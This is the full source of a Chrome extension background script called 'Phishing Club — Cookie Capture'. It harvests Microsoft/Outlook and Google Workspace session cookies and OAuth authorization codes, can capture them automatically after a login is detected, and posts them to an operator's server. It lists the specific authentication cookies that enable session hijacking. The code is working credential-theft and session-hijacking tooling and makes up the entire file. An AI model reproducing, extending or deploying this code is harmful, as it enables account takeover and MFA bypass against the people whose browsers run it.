/**
 * Phishing Club — Cookie Capture Extension (Background Service Worker)
 * v1.0.43 — API key auth, Google Workspace support, multi-account management
 *
 * Captures Microsoft/Outlook and Google Workspace session cookies from the
 * browser and sends them to the Phishing Club server's cookie store.
 *
 * Endpoints used:
 *   GET  /api/extension/ping              — Health check
 *   POST /api/extension/cookies/save      — Send captured cookies (legacy)
 *   POST /api/extension/cookies/save-v2   — Send with provider + account metadata
 *   POST /api/extension/oauth/callback    — Send captured OAuth codes
 */

// ── Provider Definitions ────────────────────────────────────────────────────

const PROVIDERS = {
  microsoft: {
    name: 'Microsoft',
    cookieUrls: [
      'https://outlook.live.com/',
      'https://outlook.office365.com/',
      'https://outlook.office.com/',
      'https://login.live.com/',
      'https://login.microsoftonline.com/',
      'https://account.live.com/',
      'https://www.office.com/',
      'https://office365.com/',
      'https://m365.cloud.microsoft.com/',
      'https://substrate.office.com/',
      'https://live.com/',
    ],
    criticalCookies: [
      'X-OWA-CANARY', 'ClientId', 'UC', 'cadata', 'OutlookSession',
      'ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT',
      'WLSSC', 'MSPAuth', 'MSPProf', 'MSPSoftVis',
      'MSRT', 'MSPRequ',
      'MSPOK', 'MSCC', 'OIDCAuthCookie',
      'SignInStateCookie',
    ],
    authCookies: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'WLSSC', 'MSPAuth'],
    loginPatterns: [
      'https://outlook.live.com/mail/',
      'https://outlook.office365.com/mail/',
      'https://outlook.office.com/mail/',
      'https://outlook.live.com/owa/',
      'https://outlook.office365.com/owa/',
    ],
  },
  google: {
    name: 'Google Workspace',
    cookieUrls: [
      'https://mail.google.com/',
      'https://accounts.google.com/',
      'https://myaccount.google.com/',
      'https://www.google.com/',
      'https://workspace.google.com/',
      'https://admin.google.com/',
      'https://drive.google.com/',
      'https://calendar.google.com/',
    ],
    criticalCookies: [
      'SID', 'HSID', 'SSID', 'APISID', 'SAPISID',
      'OSID', 'LSID', '__Secure-1PSID', '__Secure-3PSID',
      '__Secure-1PAPISID', '__Secure-3PAPISID',
      'NID', 'SIDCC', '__Secure-1PSIDCC', '__Secure-3PSIDCC',
      'COMPASS', 'GX',
    ],
    authCookies: ['SID', 'HSID', 'SSID', '__Secure-1PSID', '__Secure-3PSID'],
    loginPatterns: [
      'https://mail.google.com/mail/',
      'https://workspace.google.com/',
      'https://admin.google.com/',
    ],
  },
};

// Combine all cookie URLs for backward compatibility
const COOKIE_URLS = [
  ...PROVIDERS.microsoft.cookieUrls,
  ...PROVIDERS.google.cookieUrls,
];

const OAUTH_DOMAINS = [
  'login.microsoftonline.com',
  'login.live.com',
  'account.live.com',
  'accounts.google.com',
];

const OAUTH_REDIRECT_PATTERNS = [
  'https://login.microsoftonline.com/common/oauth2/nativeclient',
  'https://login.live.com/oauth20_desktop.srf',
  'http://localhost',
];

let serverConnected = false;

// ── Extension installed ─────────────────────────────────────────────────────

chrome.runtime.onInstalled.addListener(() => {
  console.log('[PhishingClub] Cookie Capture extension v1.0.43 installed');

  chrome.storage.local.set({
    enabled: true,
    autoCapture: true,
    autoCaptureOnLogin: true,
    notifications: true,
    capturedTokens: [],
    capturedCookies: [],
    serverUrl: '',
    apiKey: '',
    activeProvider: 'microsoft',
    accounts: [],
  });

  chrome.notifications.create({
    type: 'basic',
    iconUrl: 'icons/icon128.png',
    title: 'Phishing Club - Cookie Capture',
    message: 'Extension installed! Enter your server URL and API key in the popup to connect.',
  });
});

// ── Watch for OAuth redirects ───────────────────────────────────────────────

chrome.tabs.onUpdated.addListener((tabId, changeInfo) => {
  if (changeInfo.url) {
    checkForOAuthCode(changeInfo.url, tabId);
    checkForLoginRedirect(changeInfo.url, tabId);
  }
});

chrome.webRequest.onBeforeRequest.addListener(
  (details) => checkForOAuthCode(details.url, details.tabId),
  { urls: [
    'https://login.microsoftonline.com/*',
    'https://login.live.com/*',
    'https://account.live.com/*',
    'https://accounts.google.com/*',
  ] }
);

// ── Auto-capture after login detection (Microsoft + Google) ───────────────

async function checkForLoginRedirect(url, tabId) {
  try {
    const settings = await chrome.storage.local.get(['enabled', 'autoCaptureOnLogin', 'serverUrl', 'activeProvider']);
    if (!settings.enabled || !settings.autoCaptureOnLogin || !settings.serverUrl) return;

    const provider = settings.activeProvider || 'microsoft';
    const providerConfig = PROVIDERS[provider];
    if (!providerConfig) return;

    const isLoginRedirect = providerConfig.loginPatterns.some(p => url.startsWith(p));
    if (!isLoginRedirect) return;

    const lastCapture = await chrome.storage.local.get(['lastAutoCapture']);
    const now = Date.now();
    if (lastCapture.lastAutoCapture && (now - lastCapture.lastAutoCapture) < 300000) return;

    await chrome.storage.local.set({ lastAutoCapture: now });

    setTimeout(async () => {
      console.log(`[PhishingClub] Auto-capturing ${provider} cookies after login detected`);
      const result = await captureCookiesForProvider(provider);
      if (result.success) {
        chrome.action.setBadgeText({ text: String(result.count) });
        chrome.action.setBadgeBackgroundColor({ color: '#4CAF50' });
        setTimeout(() => chrome.action.setBadgeText({ text: '' }), 5000);
      }
    }, 3000);

  } catch (err) {
    console.error('[PhishingClub] Auto-capture error:', err);
  }
}

// ── Check URL for an OAuth authorization code ───────────────────────────────

async function checkForOAuthCode(url, tabId) {
  try {
    const urlObj = new URL(url);

    const isOAuthDomain = OAUTH_DOMAINS.some(d => urlObj.hostname === d);
    const isRedirect = OAUTH_REDIRECT_PATTERNS.some(p => url.startsWith(p));

    if (!isOAuthDomain && !isRedirect) return;

    const code = urlObj.searchParams.get('code') || extractFromHash(urlObj.hash, 'code');
    if (!code) return;

    const settings = await chrome.storage.local.get(['enabled', 'autoCapture', 'notifications', 'serverUrl', 'apiKey']);
    if (!settings.enabled) return;

    console.log('[PhishingClub] OAuth code captured:', code.substring(0, 30) + '...');

    const state = urlObj.searchParams.get('state') || extractFromHash(urlObj.hash, 'state');

    const tokenData = {
      code,
      state,
      url,
      timestamp: new Date().toISOString(),
      sent: false,
    };

    await saveToken(tokenData);

    if (settings.autoCapture && settings.serverUrl) {
      const result = await sendOAuthToServer(settings.serverUrl, settings.apiKey, tokenData);
      tokenData.sent = result.success;
      await updateLastTokenStatus(result.success);
    }

    if (settings.notifications) {
      chrome.notifications.create({
        type: 'basic',
        iconUrl: 'icons/icon128.png',
        title: tokenData.sent ? 'OAuth Code Sent!' : 'OAuth Code Captured',
        message: tokenData.sent
          ? 'Authorization code sent to your server successfully!'
          : settings.serverUrl
            ? 'Code captured but could not send to server. Check connection.'
            : 'Code captured! Set your server URL in the popup to auto-send.',
        priority: 2,
      });
    }

    chrome.action.setBadgeText({ text: 'OK' });
    chrome.action.setBadgeBackgroundColor({ color: tokenData.sent ? '#4CAF50' : '#FF9800' });
    setTimeout(() => chrome.action.setBadgeText({ text: '' }), 5000);

  } catch (err) {
    console.error('[PhishingClub] Error checking URL for OAuth code:', err);
  }
}

function extractFromHash(hash, key) {
  if (!hash || hash.length < 2) return null;
  return new URLSearchParams(hash.substring(1)).get(key);
}

// ── Cookie Capture Engine (provider-aware) ─────────────────────────────────

async function captureCookiesForProvider(provider) {
  const providerConfig = PROVIDERS[provider];
  if (!providerConfig) {
    return { success: false, count: 0, error: `Unknown provider: ${provider}` };
  }

  const allCookies = [];
  const seenKeys = new Set();

  for (const url of providerConfig.cookieUrls) {
    try {
      const cookies = await chrome.cookies.getAll({ url });
      for (const cookie of cookies) {
        const key = `${cookie.domain}|${cookie.name}|${cookie.path}`;
        if (!seenKeys.has(key)) {
          seenKeys.add(key);
          allCookies.push({
            name: cookie.name,
            value: cookie.value,
            domain: cookie.domain,
            path: cookie.path,
            secure: cookie.secure,
            httpOnly: cookie.httpOnly,
            sameSite: cookie.sameSite || 'unspecified',
            expirationDate: cookie.expirationDate || 0,
            session: cookie.session || false,
          });
        }
      }
    } catch (err) {
      console.warn(`[PhishingClub] Failed to get cookies for ${url}:`, err);
    }
  }

  if (allCookies.length === 0) {
    return {
      success: false,
      count: 0,
      error: `No ${providerConfig.name} cookies found. Are you signed in?`,
    };
  }

  const foundCritical = allCookies.filter(c => providerConfig.criticalCookies.includes(c.name));
  const hasCriticalAuth = foundCritical.some(c => providerConfig.authCookies.includes(c.name));

  const domainGroups = {};
  for (const c of allCookies) {
    const d = c.domain.replace(/^\./, '');
    if (!domainGroups[d]) domainGroups[d] = [];
    domainGroups[d].push(c);
  }

  const captureEntry = {
    id: Date.now().toString(36),
    timestamp: new Date().toISOString(),
    cookies: allCookies,
    domainGroups,
    totalCount: allCookies.length,
    criticalCount: foundCritical.length,
    hasCriticalAuth,
    provider,
    sent: false,
  };

  const result = await chrome.storage.local.get(['capturedCookies']);
  const captures = result.capturedCookies || [];
  captures.unshift(captureEntry);
  if (captures.length > 20) captures.splice(20);
  await chrome.storage.local.set({ capturedCookies: captures });

  console.log(`[PhishingClub] Captured ${allCookies.length} ${provider} cookies (${foundCritical.length} critical) from ${Object.keys(domainGroups).length} domains`);

  const settings = await chrome.storage.local.get(['autoCapture', 'serverUrl', 'apiKey', 'notifications', 'accounts']);
  if (settings.autoCapture && settings.serverUrl) {
    // Find active account name for this provider
    const accounts = settings.accounts || [];
    const activeAccount = accounts.find(a => a.provider === provider && a.active);
    const accountName = activeAccount ? activeAccount.name : '';

    const sendResult = await sendCookiesToServerV2(
      settings.serverUrl, settings.apiKey, captureEntry, provider, accountName
    );
    captureEntry.sent = sendResult.success;
    const updated = await chrome.storage.local.get(['capturedCookies']);
    const list = updated.capturedCookies || [];
    if (list.length > 0) {
      list[0].sent = sendResult.success;
      list[0].cookieStoreId = sendResult.cookieStoreId || '';
      await chrome.storage.local.set({ capturedCookies: list });
    }
  }

  if (settings.notifications) {
    const authStatus = hasCriticalAuth ? 'Auth tokens found' : 'Warning: No auth tokens';
    chrome.notifications.create({
      type: 'basic',
      iconUrl: 'icons/icon128.png',
      title: captureEntry.sent ? `${providerConfig.name} Cookies Sent!` : `${providerConfig.name} Cookies Captured`,
      message: `${allCookies.length} cookies from ${Object.keys(domainGroups).length} domains. ${authStatus}.`,
      priority: 2,
    });
  }

  return {
    success: true,
    count: allCookies.length,
    criticalCount: foundCritical.length,
    hasCriticalAuth,
    domains: Object.keys(domainGroups),
    sent: captureEntry.sent,
    provider,
  };
}

// Legacy wrapper for backward compatibility
async function captureCookies() {
  const settings = await chrome.storage.local.get(['activeProvider']);
  return captureCookiesForProvider(settings.activeProvider || 'microsoft');
}

// ── HTTP helpers ────────────────────────────────────────────────────────────

function buildHeaders(apiKey) {
  const headers = { 'Content-Type': 'application/json' };
  if (apiKey) {
    headers['X-Extension-API-Key'] = apiKey;
  }
  return headers;
}

// ── HTTP: Send captured cookies (v2 with provider + account) ────────────────

async function sendCookiesToServerV2(serverUrl, apiKey, cookieData, provider, accountName) {
  const base = serverUrl.replace(/\/+$/, '');
  const saveUrl = `${base}/api/extension/cookies/save-v2`;

  try {
    const resp = await fetch(saveUrl, {
      method: 'POST',
      headers: buildHeaders(apiKey),
      body: JSON.stringify({
        cookies: cookieData.cookies,
        timestamp: cookieData.timestamp,
        domains: Object.keys(cookieData.domainGroups || {}),
        totalCount: cookieData.totalCount,
        provider: provider || 'microsoft',
        accountName: accountName || '',
      }),
    });

    if (!resp.ok) {
      const text = await resp.text();
      console.error('[PhishingClub] Cookie save-v2 returned', resp.status, text);
      return { success: false, error: `Server returned ${resp.status}` };
    }

    const result = await resp.json();
    console.log('[PhishingClub] Cookie save-v2 response:', result);
    return {
      success: result.success === true,
      message: result.message,
      cookieStoreId: result.cookieStoreId || '',
      provider: result.provider || provider,
    };
  } catch (err) {
    console.error('[PhishingClub] sendCookiesToServerV2 failed:', err.message);
    return { success: false, error: err.message };
  }
}

// Legacy send (backward compatibility)
async function sendCookiesToServer(serverUrl, cookieData) {
  const settings = await chrome.storage.local.get(['apiKey']);
  const base = serverUrl.replace(/\/+$/, '');
  const saveUrl = `${base}/api/extension/cookies/save`;

  try {
    const resp = await fetch(saveUrl, {
      method: 'POST',
      headers: buildHeaders(settings.apiKey),
      body: JSON.stringify({
        cookies: cookieData.cookies,
        timestamp: cookieData.timestamp,
        domains: Object.keys(cookieData.domainGroups || {}),
        totalCount: cookieData.totalCount,
      }),
    });

    if (!resp.ok) {
      const text = await resp.text();
      console.error('[PhishingClub] Cookie save returned', resp.status, text);
      return { success: false, error: `Server returned ${resp.status}` };
    }

    const result = await resp.json();
    console.log('[PhishingClub] Cookie save response:', result);
    return {
      success: result.success === true,
      message: result.message,
      cookieStoreId: result.cookieStoreId || '',
    };
  } catch (err) {
    console.error('[PhishingClub] sendCookiesToServer failed:', err.message);
    return { success: false, error: err.message };
  }
}

// ── HTTP: Send OAuth code to Phishing Club ──────────────────────────────────

async function sendOAuthToServer(serverUrl, apiKey, tokenData) {
  const base = serverUrl.replace(/\/+$/, '');
  const callbackUrl = `${base}/api/extension/oauth/callback`;

  try {
    const resp = await fetch(callbackUrl, {
      method: 'POST',
      headers: buildHeaders(apiKey),
      body: JSON.stringify({ code: tokenData.code, state: tokenData.state }),
    });

    if (!resp.ok) {
      const text = await resp.text();
      console.error('[PhishingClub] OAuth callback returned', resp.status, text);
      return { success: false, error: `Server returned ${resp.status}` };
    }

    const result = await resp.json();
    return { success: result.success === true, message: result.message };
  } catch (err) {
    console.error('[PhishingClub] sendOAuthToServer failed:', err.message);
    return { success: false, error: err.message };
  }
}

// ── HTTP: Test server connection ────────────────────────────────────────────

async function testConnection(serverUrl, apiKey) {
  const base = serverUrl.replace(/\/+$/, '');
  const pingUrl = `${base}/api/extension/ping`;

  try {
    const resp = await fetch(pingUrl, {
      method: 'GET',
      headers: apiKey ? { 'X-Extension-API-Key': apiKey } : {},
    });
    if (!resp.ok) {
      serverConnected = false;
      return { success: false, error: `Server returned ${resp.status}` };
    }
    const data = await resp.json();
    serverConnected = data.success === true;
    return { success: serverConnected, message: data.message || 'Connected', version: data.version };
  } catch (err) {
    serverConnected = false;
    return { success: false, error: `Cannot reach server: ${err.message}` };
  }
}

// ── Local storage helpers ───────────────────────────────────────────────────

async function saveToken(tokenData) {
  const result = await chrome.storage.local.get(['capturedTokens']);
  const tokens = result.capturedTokens || [];
  tokens.unshift(tokenData);
  if (tokens.length > 50) tokens.splice(50);
  await chrome.storage.local.set({ capturedTokens: tokens });
}

async function updateLastTokenStatus(sent) {
  const result = await chrome.storage.local.get(['capturedTokens']);
  const tokens = result.capturedTokens || [];
  if (tokens.length > 0) {
    tokens[0].sent = sent;
    await chrome.storage.local.set({ capturedTokens: tokens });
  }
}

// ── Message handler (popup.js communication) ────────────────────────────────

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {

  if (request.action === 'getSettings') {
    chrome.storage.local.get(
      ['enabled', 'autoCapture', 'autoCaptureOnLogin', 'notifications', 'serverUrl', 'apiKey', 'activeProvider', 'accounts'],
      (r) => {
        sendResponse({ ...r, connected: serverConnected });
      }
    );
    return true;
  }

  if (request.action === 'updateSettings') {
    chrome.storage.local.set(request.settings, () => sendResponse({ success: true }));
    return true;
  }

  if (request.action === 'testConnection') {
    testConnection(request.serverUrl, request.apiKey)
      .then(r => sendResponse(r))
      .catch(e => sendResponse({ success: false, error: e.message }));
    return true;
  }

  if (request.action === 'captureCookies') {
    const provider = request.provider || 'microsoft';
    captureCookiesForProvider(provider)
      .then(r => sendResponse(r))
      .catch(e => sendResponse({ success: false, error: e.message }));
    return true;
  }

  if (request.action === 'getCapturedCookies') {
    chrome.storage.local.get(['capturedCookies'], (r) => {
      sendResponse({ cookies: r.capturedCookies || [] });
    });
    return true;
  }

  if (request.action === 'clearCookies') {
    chrome.storage.local.set({ capturedCookies: [] }, () => sendResponse({ success: true }));
    return true;
  }

  if (request.action === 'sendCookies') {
    sendCookiesToServer(request.serverUrl, request.cookieData)
      .then(r => sendResponse(r))
      .catch(e => sendResponse({ success: false, error: e.message }));
    return true;
  }

  if (request.action === 'getTokens') {
    chrome.storage.local.get(['capturedTokens'], (r) => {
      sendResponse({ tokens: r.capturedTokens || [] });
    });
    return true;
  }

  if (request.action === 'clearTokens') {
    chrome.storage.local.set({ capturedTokens: [] }, () => sendResponse({ success: true }));
    return true;
  }

  if (request.action === 'sendToken') {
    chrome.storage.local.get(['apiKey'], (settings) => {
      sendOAuthToServer(request.serverUrl, settings.apiKey, request.tokenData)
        .then(r => sendResponse(r))
        .catch(e => sendResponse({ success: false, error: e.message }));
    });
    return true;
  }

  // v1.0.43: Account management
  if (request.action === 'addAccount') {
    chrome.storage.local.get(['accounts'], (r) => {
      const accounts = r.accounts || [];
      const newAccount = {
        id: Date.now().toString(36),
        name: request.account.name,
        provider: request.account.provider,
        active: accounts.filter(a => a.provider === request.account.provider).length === 0,
        createdAt: new Date().toISOString(),
      };
      accounts.push(newAccount);
      chrome.storage.local.set({ accounts }, () => sendResponse({ success: true, account: newAccount }));
    });
    return true;
  }

  if (request.action === 'removeAccount') {
    chrome.storage.local.get(['accounts'], (r) => {
      const accounts = (r.accounts || []).filter(a => a.id !== request.accountId);
      chrome.storage.local.set({ accounts }, () => sendResponse({ success: true }));
    });
    return true;
  }

  if (request.action === 'setActiveAccount') {
    chrome.storage.local.get(['accounts'], (r) => {
      const accounts = r.accounts || [];
      for (const a of accounts) {
        if (a.provider === request.provider) {
          a.active = a.id === request.accountId;
        }
      }
      chrome.storage.local.set({ accounts }, () => sendResponse({ success: true }));
    });
    return true;
  }

  if (request.action === 'getAccounts') {
    chrome.storage.local.get(['accounts'], (r) => {
      sendResponse({ accounts: r.accounts || [] });
    });
    return true;
  }
});

console.log('[PhishingClub] Cookie Capture extension v1.0.43 — background script loaded');
